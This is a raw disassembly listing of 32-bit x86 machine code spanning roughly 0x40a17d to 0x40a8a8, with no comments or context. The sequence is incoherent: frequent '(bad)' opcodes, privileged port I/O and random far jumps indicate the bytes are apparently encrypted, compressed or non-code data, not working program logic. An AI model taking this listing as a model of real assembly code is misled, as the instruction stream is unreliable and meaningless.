  40a17d:	sbb    edx,DWORD PTR [esp+edi*4-0x3c77efb5]
  40a184:	loop   0x40a15c
  40a186:	and    esi,DWORD PTR [edx+0x66]
  40a189:	mov    ebx,0x6f955022
  40a18e:	cmp    al,0xc3
  40a190:	(bad)  
  40a191:	(bad)  
  40a192:	xchg   edx,eax
  40a193:	data16 icebp 
  40a195:	fisub  WORD PTR [esi+0x4a]
  40a198:	dec    ecx
  40a199:	cmp    eax,0x8b83a4bf
  40a19e:	ja     0x40a18c
  40a1a0:	fsubr  DWORD PTR [ebx-0x1]
  40a1a3:	mov    eax,0xc65be8b9
  40a1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1a9:	(bad)  
  40a1aa:	shl    BYTE PTR ds:[esi+0x16],cl
  40a1ae:	loopne 0x40a20c
  40a1b0:	xor    edx,eax
  40a1b2:	or     dh,BYTE PTR [eax]
  40a1b4:	or     BYTE PTR [esp-0x4c97f09a],bh
  40a1bb:	and    cl,ah
  40a1bd:	or     BYTE PTR [esp+ebp*8+0x2d],0x8c
  40a1c2:	test   DWORD PTR [edx+0x45],ebp
  40a1c5:	mov    esi,DWORD PTR ds:0x64cdc46c
  40a1cb:	cli    
  40a1cc:	add    bl,BYTE PTR [eax+0x37376a2f]
  40a1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d3:	and    al,0xb
  40a1d6:	jmp    DWORD PTR [ebx]
  40a1d8:	sbb    al,al
  40a1da:	xor    DWORD PTR [edx+edx*4-0x5a],esi
  40a1de:	jp     0x40a16a
  40a1e0:	sbb    eax,0xa4ed7465
  40a1e5:	(bad)  
  40a1e6:	jnp    0x40a17d
  40a1e8:	xor    ah,BYTE PTR [ecx+0x20]
  40a1eb:	xor    esp,DWORD PTR [esi-0x54]
  40a1ee:	add    BYTE PTR [ebp-0x4e6d2eaa],bh
  40a1f4:	loopne 0x40a17a
  40a1f6:	addr16 das 
  40a1f8:	inc    eax
  40a1f9:	xor    eax,0x45b1d75b
  40a1fe:	inc    esi
  40a1ff:	fmul   st,st(0)
  40a201:	inc    esp
  40a202:	jl     0x40a193
  40a204:	ret    0xc34c
  40a207:	mov    ah,0x7f
  40a209:	jle    0x40a214
  40a20b:	pushf  
  40a20c:	adc    al,ah
  40a20e:	cwde   
  40a20f:	aam    0x29
  40a211:	pushf  
  40a212:	dec    esp
  40a213:	(bad)  
  40a214:	(bad)
  40a218:	sub    DWORD PTR [ebp+eax*8-0x16780c42],esp
  40a21f:	nop
  40a220:	or     BYTE PTR [eax+0x2460a2d9],cl
  40a226:	mov    esi,0x28540b5e
  40a22b:	bound  edi,QWORD PTR [edi]
  40a22d:	adc    al,0xf2
  40a22f:	loopne 0x40a216
  40a231:	dec    ecx
  40a232:	ror    cl,cl
  40a234:	sbb    bh,bh
  40a236:	out    dx,al
  40a237:	push   0xea4cd498
  40a23c:	jno    0x40a1eb
  40a23e:	out    dx,al
  40a23f:	test   al,ch
  40a241:	xchg   BYTE PTR [ebx+0x5],ah
  40a244:	mov    cl,0x47
  40a246:	rcl    BYTE PTR [edx-0x57],cl
  40a249:	xchg   ebx,eax
  40a24a:	push   0xd285af4b
  40a24f:	push   0x6f1c827f
  40a254:	inc    eax
  40a255:	lods   eax,DWORD PTR ds:[esi]
  40a256:	mov    ch,0x48
  40a258:	daa    
  40a259:	sar    BYTE PTR [eax],cl
  40a25b:	daa    
  40a25c:	push   edx
  40a25d:	fdivr  QWORD PTR [ebp+0x2b]
  40a260:	int3   
  40a261:	and    BYTE PTR [edi+0xf],0x9a
  40a265:	rol    DWORD PTR [ebx-0x72558a02],cl
  40a26b:	into   
  40a26c:	mov    edx,0xbe6ccb59
  40a271:	jl     0x40a2a4
  40a273:	fld    TBYTE PTR [edx+0x7e]
  40a276:	cmp    ebx,DWORD PTR gs:[eax+0x3d]
  40a27a:	int3   
  40a27b:	fmulp  st(7),st
  40a27d:	jecxz  0x40a26c
  40a27f:	popf   
  40a280:	xor    al,0x31
  40a282:	pop    esi
  40a283:	aam    0x9c
  40a285:	mov    bh,BYTE PTR ds:0x96ed3b2c
  40a28b:	mov    ds:0x15d9cd53,eax
  40a290:	mov    DWORD PTR [edi-0x30235a08],0xa76f150b
  40a29a:	fistp  QWORD PTR [edx]
  40a29c:	cdq    
  40a29d:	mov    esp,ebx
  40a29f:	dec    esp
  40a2a0:	mov    dh,0xb0
  40a2a2:	xchg   BYTE PTR [eax+0x6a],cl
  40a2a5:	jo     0x40a2a3
  40a2a7:	jg     0x40a23d
  40a2a9:	lea    ecx,[ecx-0x64]
  40a2ac:	inc    esp
  40a2ad:	int    0xa1
  40a2af:	inc    ecx
  40a2b0:	imul   edi,DWORD PTR [ecx+0x372acd4],0x1995304b
  40a2ba:	sub    edi,DWORD PTR [esi-0x12]
  40a2bd:	pop    ds
  40a2be:	nop
  40a2bf:	(bad)  
  40a2c0:	xor    al,0xe0
  40a2c2:	stos   BYTE PTR es:[edi],al
  40a2c3:	in     eax,0xd3
  40a2c5:	shr    BYTE PTR [edi-0x36],0x4
  40a2c9:	adc    BYTE PTR [esi+0x71e83706],bh
  40a2cf:	mov    cl,0xcd
  40a2d1:	jno    0x40a2b4
  40a2d3:	dec    esp
  40a2d4:	sbb    cl,BYTE PTR [edx+0x6900e1f2]
  40a2da:	stc    
  40a2db:	fdiv   QWORD PTR [ebx-0x18984032]
  40a2e1:	(bad)  
  40a2e3:	cmp    al,0x97
  40a2e5:	push   esi
  40a2e6:	outs   dx,DWORD PTR ds:[esi]
  40a2e7:	scas   al,BYTE PTR es:[edi]
  40a2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e9:	adc    esp,DWORD PTR [ebx-0x432dd1f6]
  40a2ef:	fld    TBYTE PTR [edx-0xa]
  40a2f2:	repnz aad 0x25
  40a2f5:	dec    edi
  40a2f6:	sub    DWORD PTR [eax+ebp*1-0x10],0xf6a25bef
  40a2fe:	and    BYTE PTR [ebp-0x45],bl
  40a301:	jp     0x40a34c
  40a303:	xchg   DWORD PTR [esi+0x418443f0],ebp
  40a309:	xchg   edx,eax
  40a30a:	push   cs
  40a30b:	mov    esp,0x7ba1c69e
  40a310:	hlt    
  40a311:	sbb    DWORD PTR [ecx-0x5364aa34],edx
  40a317:	mov    eax,ds:0x1abea3ce
  40a31c:	sub    BYTE PTR [edi+0x57],cl
  40a31f:	jmp    0xf564:0x7bf941dc
  40a326:	sbb    DWORD PTR [edx],0x3
  40a329:	fwait
  40a32a:	stos   DWORD PTR es:[edi],eax
  40a32b:	cmp    cl,BYTE PTR [ebx]
  40a32d:	pop    edi
  40a32e:	lea    esp,[edx-0x3a]
  40a331:	int3   
  40a332:	pop    ecx
  40a333:	popa   
  40a334:	sbb    al,0x8c
  40a336:	test   al,0xa1
  40a338:	mov    eax,0x4a3de357
  40a33d:	cmp    eax,0xf023223a
  40a342:	bound  ecx,QWORD PTR [esi+0x6d34b991]
  40a348:	push   ebx
  40a349:	dec    ebp
  40a34a:	push   esp
  40a34b:	out    0x8a,eax
  40a34d:	repz fstp TBYTE PTR [ebp-0x12]
  40a351:	dec    edx
  40a352:	adc    esp,edx
  40a354:	xchg   ebx,eax
  40a355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a356:	js     0x40a30d
  40a358:	mov    eax,ds:0x6cccf17b
  40a35d:	rcl    BYTE PTR [edi],1
  40a35f:	rol    edx,0xe1
  40a362:	xchg   ecx,eax
  40a363:	inc    edx
  40a364:	mov    dh,0x8d
  40a366:	and    eax,ebx
  40a368:	ds daa 
  40a36a:	aas    
  40a36b:	frstor [edi+0x6ee92d6d]
  40a371:	xchg   edi,eax
  40a372:	adc    eax,0x7dccd576
  40a377:	push   edx
  40a378:	adc    esi,DWORD PTR [ecx+edi*1-0x68]
  40a37c:	sbb    al,0xe6
  40a37e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a37f:	cld    
  40a380:	fiadd  WORD PTR [edx]
  40a382:	(bad)  
  40a383:	aad    0x85
  40a385:	imul   ebx,ecx,0x53dc805e
  40a38b:	clc    
  40a38c:	sbb    DWORD PTR [ebp-0x2a],ebx
  40a38f:	sbb    DWORD PTR [eax],0xc26549d1
  40a395:	jle    0x40a3a7
  40a397:	mov    eax,ds:0xc655bc7d
  40a39c:	ins    BYTE PTR es:[edi],dx
  40a39d:	pop    ds
  40a39e:	fisub  DWORD PTR [edi]
  40a3a0:	in     al,dx
  40a3a1:	mov    ebx,0xef0849a9
  40a3a6:	pop    ds
  40a3a7:	(bad)
  40a3ac:	retf   
  40a3ad:	fdivr  QWORD PTR [eax-0x73]
  40a3b0:	fdiv   st,st(6)
  40a3b2:	scas   eax,DWORD PTR es:[edi]
  40a3b3:	shl    BYTE PTR [ecx-0x1c49b838],0x5c
  40a3ba:	test   BYTE PTR [ebp+0x3e07f5f1],al
  40a3c0:	sub    eax,0x348b95ba
  40a3c5:	push   ebp
  40a3c6:	cld    
  40a3c7:	adc    eax,0x8529dcd8
  40a3cc:	push   0xa324f67f
  40a3d1:	xor    BYTE PTR [eax+esi*2+0x2a1be6e7],ah
  40a3d8:	or     eax,0x3fcc5440
  40a3dd:	pop    ss
  40a3de:	(bad)  
  40a3df:	jmp    0x732:0x54ee1639
  40a3e6:	mov    ah,dl
  40a3e8:	call   0x46d326e4
  40a3ed:	xor    cl,BYTE PTR [eax-0x69ea480a]
  40a3f3:	xchg   edx,eax
  40a3f4:	sub    DWORD PTR [esi+0x684b32c0],esi
  40a3fa:	shr    BYTE PTR [eax-0x57d12e3a],cl
  40a400:	fwait
  40a401:	push   ebx
  40a402:	mov    edx,0x4bcb2e9
  40a407:	cdq    
  40a408:	test   eax,0x25065dbc
  40a40d:	stos   DWORD PTR es:[edi],eax
  40a40e:	and    dl,BYTE PTR [esi+0x38425f2a]
  40a414:	fwait
  40a415:	push   esp
  40a416:	mov    DWORD PTR [esi+0x55],esi
  40a419:	aam    0x9
  40a41b:	mov    eax,esp
  40a41d:	dec    edi
  40a41e:	(bad)  
  40a41f:	ds fprem 
  40a422:	retf   
  40a423:	add    al,0x50
  40a425:	or     al,0x7e
  40a427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a428:	shl    al,cl
  40a42a:	pop    edx
  40a42b:	pushf  
  40a42c:	arpl   bp,di
  40a42e:	mov    bl,0x81
  40a430:	sbb    al,0xad
  40a432:	fldenv [edi+0x5f]
  40a435:	sbb    al,0xcb
  40a437:	jp     0x40a41b
  40a439:	xor    eax,0xe7322600
  40a43e:	int    0xa5
  40a440:	ret    
  40a441:	mov    ecx,0xfe01537f
  40a446:	pop    es
  40a447:	ins    DWORD PTR es:[edi],dx
  40a448:	in     eax,0xa9
  40a44a:	xor    DWORD PTR [ebp-0x67],ebx
  40a44d:	add    ecx,DWORD PTR [ecx-0x7936aa72]
  40a453:	les    esi,FWORD PTR [edx]
  40a455:	aas    
  40a456:	ins    BYTE PTR es:[edi],dx
  40a457:	xchg   ebp,eax
  40a458:	push   ebp
  40a459:	sbb    DWORD PTR [edx],ebp
  40a45b:	lods   eax,DWORD PTR ds:[esi]
  40a45c:	stos   BYTE PTR es:[edi],al
  40a45d:	dec    esp
  40a45e:	cmp    ebp,DWORD PTR [ebx+esi*4+0x31]
  40a462:	pop    edx
  40a463:	mov    WORD PTR [esi+0x4144d35],ds
  40a469:	cmp    DWORD PTR [edi-0x6f],0xffffffb6
  40a46d:	ret    0x7de5
  40a470:	sub    BYTE PTR [edi+0x57e7e8e0],al
  40a476:	in     al,0x1d
  40a478:	xor    esp,DWORD PTR [esi-0x77b8b118]
  40a47e:	xchg   esi,eax
  40a47f:	xlat   BYTE PTR ds:[ebx]
  40a480:	xor    DWORD PTR ds:0xd37cd8b7,ebp
  40a486:	lods   al,BYTE PTR fs:[esi]
  40a488:	dec    ecx
  40a489:	xchg   edi,eax
  40a48a:	aaa    
  40a48b:	cmp    al,0xe9
  40a48d:	pop    esi
  40a48e:	daa    
  40a48f:	arpl   WORD PTR ds:0x9198f6f9,bx
  40a495:	fcom   DWORD PTR [edx+0x4c]
  40a498:	aaa    
  40a499:	inc    ecx
  40a49a:	imul   ecx,edx,0xffffffbe
  40a49d:	jbe    0x40a492
  40a49f:	jp     0x40a4ba
  40a4a1:	ds mov bl,0x8d
  40a4a4:	mov    al,ds:0x3fac4dfb
  40a4a9:	addr16 in al,dx
  40a4ab:	inc    ebx
  40a4ac:	mov    eax,ds:0x7a338b7a
  40a4b1:	jbe    0x40a498
  40a4b3:	jg     0x40a491
  40a4b5:	inc    esp
  40a4b6:	dec    esi
  40a4b7:	push   ds
  40a4b8:	imul   DWORD PTR [ecx]
  40a4ba:	mov    ah,0xd1
  40a4bc:	outs   dx,BYTE PTR ds:[esi]
  40a4bd:	pop    es
  40a4be:	icebp  
  40a4bf:	cli    
  40a4c0:	xor    esp,ebp
  40a4c2:	cdq    
  40a4c3:	add    cl,al
  40a4c5:	jecxz  0x40a482
  40a4c7:	push   ebx
  40a4c8:	fmul   DWORD PTR [eax]
  40a4ca:	mov    dl,0x99
  40a4cc:	jb     0x40a454
  40a4ce:	jbe    0x40a4b5
  40a4d0:	pop    edx
  40a4d1:	aas    
  40a4d2:	imul   ebp,DWORD PTR [eax],0x38
  40a4d5:	cld    
  40a4d6:	sub    BYTE PTR [esi+0x3d],0xbc
  40a4da:	xchg   edi,eax
  40a4db:	sub    al,0x1b
  40a4dd:	rcl    edx,0x90
  40a4e0:	aam    0xdb
  40a4e2:	xchg   eax,edi
  40a4e4:	cmp    DWORD PTR [ebx+0x5],ecx
  40a4e7:	sbb    ch,BYTE PTR [esi-0x6b98aff2]
  40a4ed:	cmp    eax,DWORD PTR [edx+0x4f]
  40a4f0:	pushw  ss
  40a4f2:	adc    al,0xa9
  40a4f4:	pop    edi
  40a4f5:	outs   dx,DWORD PTR ds:[esi]
  40a4f6:	add    ecx,DWORD PTR [ecx-0x3e]
  40a4f9:	jp     0x40a551
  40a4fb:	jno    0x40a502
  40a4fd:	imul   BYTE PTR [ebp+0x24]
  40a500:	and    eax,0xde903515
  40a505:	out    dx,eax
  40a506:	cmc    
  40a507:	fisub  WORD PTR [eax+0x6a]
  40a50a:	fcom   DWORD PTR [ecx]
  40a50c:	stos   BYTE PTR es:[edi],al
  40a50d:	and    ebp,DWORD PTR [ebx+0x60]
  40a510:	push   esp
  40a511:	ror    DWORD PTR [esi-0x5a],cl
  40a514:	push   ds
  40a515:	sahf   
  40a516:	(bad)
  40a519:	pusha  
  40a51a:	xchg   ecx,eax
  40a51b:	fldcw  WORD PTR [ecx]
  40a51d:	aad    0x35
  40a51f:	inc    ebx
  40a520:	add    eax,0x27b09d20
  40a525:	lds    ebp,FWORD PTR [ebx-0x2d]
  40a528:	lods   al,BYTE PTR ds:[esi]
  40a529:	(bad)  
  40a52a:	mov    eax,ds:0x83f2fb7f
  40a52f:	aad    0xf0
  40a531:	in     eax,0x23
  40a533:	das    
  40a534:	add    ah,BYTE PTR [edx]
  40a536:	pop    esp
  40a537:	dec    eax
  40a538:	jo     0x40a559
  40a53a:	pusha  
  40a53b:	cmp    cl,BYTE PTR [edi]
  40a53d:	adc    dl,BYTE PTR [eax]
  40a53f:	imul   edi,eax,0x8d40005e
  40a545:	and    edx,edx
  40a547:	xor    al,BYTE PTR [ebp-0x2b]
  40a54a:	pushf  
  40a54b:	inc    ecx
  40a54c:	mov    ah,0x16
  40a54e:	pop    ss
  40a54f:	outs   dx,BYTE PTR ds:[esi]
  40a550:	or     edi,DWORD PTR [ecx]
  40a552:	int3   
  40a553:	mov    ds:0x331047aa,eax
  40a558:	sub    DWORD PTR [esi+0x33],edx
  40a55b:	push   es
  40a55c:	test   esp,ebp
  40a55e:	sbb    ebp,DWORD PTR [ebx-0x85b41cc]
  40a564:	ins    BYTE PTR es:[edi],dx
  40a565:	add    DWORD PTR [ebp+0x51],eax
  40a568:	mov    eax,ds:0x24c1bea2
  40a56d:	pop    edi
  40a56e:	jnp    0x40a5ae
  40a570:	loop   0x40a57e
  40a572:	mov    bl,BYTE PTR [edi+0x23]
  40a575:	and    eax,DWORD PTR [esi+ebx*1+0x6]
  40a579:	jnp    0x40a549
  40a57b:	not    ch
  40a57d:	aam    0x9f
  40a57f:	cld    
  40a580:	xor    al,0x4b
  40a582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a583:	stos   DWORD PTR es:[edi],eax
  40a584:	jecxz  0x40a59a
  40a586:	mov    ebx,0x798b9bae
  40a58b:	(bad)  
  40a58c:	jno    0x40a576
  40a58e:	jmp    0x46fc:0xa717d0de
  40a595:	pushf  
  40a596:	push   ds
  40a597:	cli    
  40a598:	sub    esp,DWORD PTR [eax-0x80]
  40a59b:	push   esp
  40a59c:	je     0x40a534
  40a59e:	lods   al,BYTE PTR ds:[esi]
  40a59f:	mov    ecx,0x632b7c9
  40a5a4:	mov    DWORD PTR [eax+0x21],ecx
  40a5a7:	into   
  40a5a8:	inc    esi
  40a5a9:	test   eax,0xe4ce61d8
  40a5ae:	jo     0x40a569
  40a5b0:	xchg   ebp,eax
  40a5b1:	and    BYTE PTR [ecx-0x22],dl
  40a5b4:	dec    esi
  40a5b5:	jns    0x40a614
  40a5b7:	jge    0x40a5a5
  40a5b9:	dec    esi
  40a5ba:	ficomp WORD PTR [edx+0x38]
  40a5bd:	call   0x9565fe94
  40a5c2:	or     eax,0x5ee2d83c
  40a5c7:	push   edx
  40a5c8:	ret    0xbab2
  40a5cb:	pop    edx
  40a5cc:	mov    ch,0xb3
  40a5ce:	lds    esp,FWORD PTR [eax]
  40a5d0:	popa   
  40a5d1:	out    0xf0,al
  40a5d3:	push   ss
  40a5d4:	dec    esp
  40a5d5:	inc    esi
  40a5d6:	push   ebx
  40a5d7:	or     al,0xa3
  40a5d9:	dec    esi
  40a5da:	push   ebp
  40a5db:	(bad)  
  40a5dc:	lods   eax,DWORD PTR ds:[esi]
  40a5dd:	push   esi
  40a5de:	scas   eax,DWORD PTR es:[edi]
  40a5df:	pop    es
  40a5e0:	xor    BYTE PTR [esp+eax*8+0xa],0x40
  40a5e5:	mov    bh,0x95
  40a5e7:	les    ecx,FWORD PTR [ebp+0x1fc5dee5]
  40a5ed:	lods   eax,DWORD PTR ds:[esi]
  40a5ee:	fld    QWORD PTR [ebx-0x21db122a]
  40a5f4:	repnz nop DWORD PTR [eax]
  40a5f8:	add    esi,DWORD PTR [ebp+0x229b2bc7]
  40a5fe:	inc    edx
  40a5ff:	scas   eax,DWORD PTR es:[edi]
  40a600:	outs   dx,BYTE PTR ds:[esi]
  40a601:	les    esi,FWORD PTR [ebp-0xf]
  40a604:	mov    eax,0x26c90bb7
  40a609:	mov    ah,0xd0
  40a60b:	in     al,0x98
  40a60d:	(bad)  
  40a60e:	xchg   ebp,eax
  40a60f:	mov    dl,0x9c
  40a611:	lods   al,BYTE PTR ds:[esi]
  40a612:	(bad)  
  40a613:	pop    ds
  40a614:	push   0xffffff82
  40a616:	adc    ebx,DWORD PTR [eax*2+0x2914be1c]
  40a61d:	xlat   BYTE PTR ds:[ebx]
  40a61e:	mov    bh,ch
  40a620:	jle    0x40a5f2
  40a622:	sahf   
  40a623:	inc    ebx
  40a624:	mov    ds:0x8346594a,eax
  40a629:	jbe    0x40a5de
  40a62b:	test   al,0x16
  40a62d:	pop    ecx
  40a62e:	cwde   
  40a62f:	iret   
  40a630:	fld    DWORD PTR [edx-0x1c]
  40a633:	and    eax,0xffffffa5
  40a636:	xchg   edi,eax
  40a637:	lods   eax,DWORD PTR ds:[esi]
  40a638:	dec    edi
  40a639:	mov    ebx,0xb6fb8941
  40a63e:	mov    edi,0x261c3f91
  40a643:	(bad)  
  40a644:	pusha  
  40a645:	or     BYTE PTR [esi],dl
  40a647:	mov    ds:0xec71b4c0,al
  40a64c:	fidiv  WORD PTR ds:0x7e091c26
  40a652:	mov    DWORD PTR ds:0xa63cb6f9,ecx
  40a658:	jl     0x40a5ed
  40a65a:	inc    ecx
  40a65b:	jno    0x40a631
  40a65d:	scas   al,BYTE PTR es:[edi]
  40a65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a65f:	jae    0x40a6a9
  40a661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a662:	mov    dl,0x90
  40a664:	nop
  40a665:	aad    0x4c
  40a667:	push   es
  40a668:	jno    0x40a655
  40a66a:	js     0x40a69d
  40a66c:	in     al,0xa0
  40a66e:	jbe    0x40a654
  40a670:	clc    
  40a671:	(bad)  
  40a673:	daa    
  40a674:	retf   
  40a675:	jnp    0x40a623
  40a677:	mov    al,0xf8
  40a679:	es and edi,0xaca9e3c5
  40a680:	jge    0x40a65c
  40a682:	pop    ebp
  40a683:	fsubr  DWORD PTR [ebx-0x19]
  40a686:	es out dx,eax
  40a688:	xor    eax,0x9a21838f
  40a68d:	sbb    ebp,DWORD PTR es:[ebp+0x60]
  40a691:	mov    edi,0x8dc97833
  40a696:	and    eax,0x44339dc8
  40a69b:	cmp    ebp,DWORD PTR [ebp+0xe]
  40a69e:	push   ecx
  40a69f:	sti    
  40a6a0:	aas    
  40a6a1:	lods   al,BYTE PTR ds:[esi]
  40a6a2:	jno    0x40a6b0
  40a6a4:	(bad)  
  40a6a5:	sti    
  40a6a6:	rcr    DWORD PTR [edi-0x7ed01ab8],1
  40a6ac:	inc    edx
  40a6ad:	pop    ebx
  40a6ae:	inc    ecx
  40a6af:	jno    0x40a728
  40a6b1:	jl     0x40a6b2
  40a6b3:	stos   DWORD PTR es:[edi],eax
  40a6b4:	in     eax,dx
  40a6b5:	mov    edx,0xe2e1b113
  40a6ba:	xor    al,0x68
  40a6bc:	outs   dx,DWORD PTR ds:[esi]
  40a6bd:	pop    es
  40a6be:	fs call 0xe935:0xee3aa6a0
  40a6c6:	adc    eax,0xbabd5aad
  40a6cb:	call   0x5106efe9
  40a6d0:	stc    
  40a6d1:	ins    BYTE PTR es:[edi],dx
  40a6d2:	fsubr  DWORD PTR [ecx-0x52]
  40a6d5:	push   0xffffffaa
  40a6d7:	pop    esp
  40a6d8:	fsub   DWORD PTR [esi]
  40a6da:	inc    edi
  40a6db:	mov    BYTE PTR [edx+0x0],dh
  40a6de:	sub    BYTE PTR [edi+0x1f],0xd6
  40a6e2:	retf   0x5740
  40a6e5:	adc    bh,BYTE PTR [edi]
  40a6e7:	inc    edx
  40a6e8:	test   al,0xed
  40a6ea:	add    ch,ch
  40a6ec:	enter  0x6f16,0x33
  40a6f0:	push   ss
  40a6f1:	adc    bh,BYTE PTR [edi+eiz*8-0x17]
  40a6f5:	dec    eax
  40a6f6:	in     al,0x5d
  40a6f8:	sub    dl,BYTE PTR [edi+0x3d4c2f07]
  40a6fe:	js     0x40a720
  40a700:	ins    DWORD PTR es:[edi],dx
  40a701:	aas    
  40a702:	rep ins BYTE PTR es:[edi],dx
  40a704:	cli    
  40a705:	cmp    eax,0x8b944ca6
  40a70a:	ss sub al,0x19
  40a70d:	int3   
  40a70e:	dec    ebx
  40a70f:	mov    dh,0xb7
  40a711:	add    al,0x90
  40a713:	dec    edi
  40a714:	leave  
  40a715:	fs dec eax
  40a717:	inc    ebx
  40a718:	(bad)  
  40a719:	xchg   ebx,eax
  40a71a:	jp     0x40a6d6
  40a71c:	loope  0x40a6d1
  40a71e:	dec    esp
  40a71f:	pop    ss
  40a720:	push   esi
  40a721:	mov    DWORD PTR [ecx-0x4e57550e],ebp
  40a727:	jb     0x40a6df
  40a729:	xchg   esp,eax
  40a72a:	jecxz  0x40a74e
  40a72c:	les    ecx,FWORD PTR [ebp+0x56]
  40a72f:	jmp    0x40a6eb
  40a731:	inc    edx
  40a732:	(bad)  
  40a733:	scas   al,BYTE PTR es:[edi]
  40a734:	pop    esi
  40a735:	cmp    ecx,DWORD PTR [edi]
  40a737:	dec    eax
  40a738:	and    eax,0xcd82f4e7
  40a73d:	sar    DWORD PTR [edx+eax*4+0x3e],1
  40a741:	and    DWORD PTR [ecx],eax
  40a743:	adc    eax,0x998803a3
  40a748:	cmp    esi,esp
  40a74a:	sbb    eax,DWORD PTR [eax]
  40a74c:	add    dl,cl
  40a74e:	or     ecx,DWORD PTR [eax-0x29]
  40a751:	mov    cl,0x9f
  40a753:	aad    0xe1
  40a755:	pmullw mm5,QWORD PTR [esi-0x3d]
  40a759:	sahf   
  40a75a:	clc    
  40a75b:	inc    ecx
  40a75c:	aas    
  40a75d:	je     0x40a766
  40a75f:	add    eax,0x3b14716f
  40a764:	cwde   
  40a765:	shr    DWORD PTR ds:0x23c4cd0b,cl
  40a76b:	call   0x4fa:0x443816df
  40a772:	cs xchg ebp,eax
  40a774:	jmp    0xe84a:0x6792d251
  40a77b:	sub    bh,BYTE PTR [ebx-0x78aa328d]
  40a781:	mov    ds,ecx
  40a783:	call   0xa357d5b4
  40a788:	jo     0x40a72e
  40a78a:	pop    esi
  40a78b:	outs   dx,DWORD PTR ds:[esi]
  40a78c:	mov    bh,0x8a
  40a78e:	std    
  40a78f:	lea    ecx,[edi]
  40a791:	(bad)  [eax+edx*1-0x24966e57]
  40a798:	loope  0x40a803
  40a79a:	adc    al,0x80
  40a79c:	aas    
  40a79d:	enter  0x3fd2,0x62
  40a7a1:	hlt    
  40a7a2:	or     edx,DWORD PTR [eax-0x3d]
  40a7a5:	js     0x40a75a
  40a7a7:	add    eax,0xe6e527e7
  40a7ac:	loopne 0x40a76a
  40a7ae:	mov    bh,0x51
  40a7b0:	dec    edi
  40a7b1:	dec    edi
  40a7b2:	push   ecx
  40a7b3:	(bad)  
  40a7b4:	dec    ebp
  40a7b5:	in     eax,dx
  40a7b6:	adc    esp,DWORD PTR [ebx]
  40a7b8:	adc    ebx,DWORD PTR fs:[ebp-0x76]
  40a7bc:	nop
  40a7bd:	mov    edx,0x8dbe3a5b
  40a7c2:	xor    BYTE PTR [edx],al
  40a7c4:	cmp    DWORD PTR [ebx],esi
  40a7c6:	fld    DWORD PTR [esi]
  40a7c8:	mov    edx,0x7313f13b
  40a7cd:	inc    ebx
  40a7ce:	sub    DWORD PTR [ebx],ecx
  40a7d0:	xchg   ecx,eax
  40a7d1:	sbb    bh,BYTE PTR [esi]
  40a7d3:	sub    eax,0x9db83308
  40a7d8:	sahf   
  40a7d9:	xchg   esi,eax
  40a7da:	mov    eax,0x9219f3df
  40a7df:	sub    al,0x18
  40a7e1:	je     0x40a791
  40a7e3:	(bad)  
  40a7e4:	jnp    0x40a77a
  40a7e6:	sar    BYTE PTR [edi+esi*1],1
  40a7e9:	shr    edx,cl
  40a7eb:	sub    cl,al
  40a7ed:	into   
  40a7ee:	cmp    DWORD PTR [ebx+edx*8+0x1ab1395e],0x0
  40a7f6:	lods   al,BYTE PTR ds:[esi]
  40a7f7:	mov    esp,0x56efc451
  40a7fc:	aad    0xbd
  40a7fe:	clc    
  40a7ff:	push   edx
  40a800:	rcl    DWORD PTR [ecx+0x27],0xdb
  40a804:	and    al,0xae
  40a806:	or     al,0xf8
  40a808:	test   bh,al
  40a80a:	mov    BYTE PTR [esi+0x58a5186b],al
  40a810:	inc    esp
  40a811:	in     al,dx
  40a812:	mov    dh,0x27
  40a814:	mov    ecx,0x37d4fe4f
  40a819:	mov    BYTE PTR [ecx],al
  40a81b:	mov    BYTE PTR [edi-0x75970c91],0xb0
  40a822:	js     0x40a88c
  40a824:	int    0x65
  40a826:	xchg   esp,eax
  40a827:	pop    ss
  40a828:	icebp  
  40a829:	push   0xffffffd8
  40a82b:	rcr    BYTE PTR [eax-0x217bf711],cl
  40a831:	sub    al,BYTE PTR [edx-0x77e9b62c]
  40a837:	aam    0x61
  40a839:	mov    eax,0x5f2ac84e
  40a83e:	fwait
  40a83f:	mov    cl,0xdf
  40a841:	ss out dx,eax
  40a843:	mov    eax,0x391a634c
  40a848:	mov    bl,0xb6
  40a84a:	fcomp  DWORD PTR [edx+0x3f]
  40a84d:	das    
  40a84e:	mov    cs,WORD PTR ss:[ecx-0x6c02914]
  40a855:	add    eax,0x3946a73a
  40a85a:	sbb    DWORD PTR [edi+0x6c],esp
  40a85d:	pop    esp
  40a85e:	dec    edi
  40a85f:	ins    DWORD PTR es:[edi],dx
  40a860:	fst    DWORD PTR [edx]
  40a862:	adc    esi,DWORD PTR [ecx+0x11]
  40a865:	test   BYTE PTR [edx],ch
  40a867:	lds    esi,FWORD PTR [ecx]
  40a869:	or     BYTE PTR fs:[ecx-0xe5cd5e9],cl
  40a870:	out    0xe5,al
  40a872:	jg     0x40a83b
  40a874:	pop    ebx
  40a875:	pop    esp
  40a876:	icebp  
  40a877:	ss push ebx
  40a879:	xchg   ebp,eax
  40a87a:	adc    edx,DWORD PTR [ebp-0x5a]
  40a87d:	xor    BYTE PTR [edi-0x1e],ah
  40a880:	hlt    
  40a881:	push   edx
  40a882:	xchg   ebx,eax
  40a883:	imul   bl
  40a885:	ja     0x40a8fe
  40a887:	adc    bl,ch
  40a889:	inc    edx
  40a88a:	inc    edi
  40a88b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a88c:	mov    ch,0xc9
  40a88e:	retf   
  40a88f:	sub    al,0x4d
  40a891:	ins    BYTE PTR es:[edi],dx
  40a892:	xchg   esp,eax
  40a893:	(bad)  
  40a894:	hlt    
  40a895:	fldln2 
  40a897:	aad    0xea
  40a899:	inc    eax
  40a89a:	sahf   
  40a89b:	mov    al,ds:0xfa230820
  40a8a0:	fwait
  40a8a1:	imul   ebp,edx,0xffffffe8
  40a8a4:	push   ecx
  40a8a5:	mov    ah,0xbb
  40a8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a8:	fsubr  DWORD PTR [edx+0x165979c1]
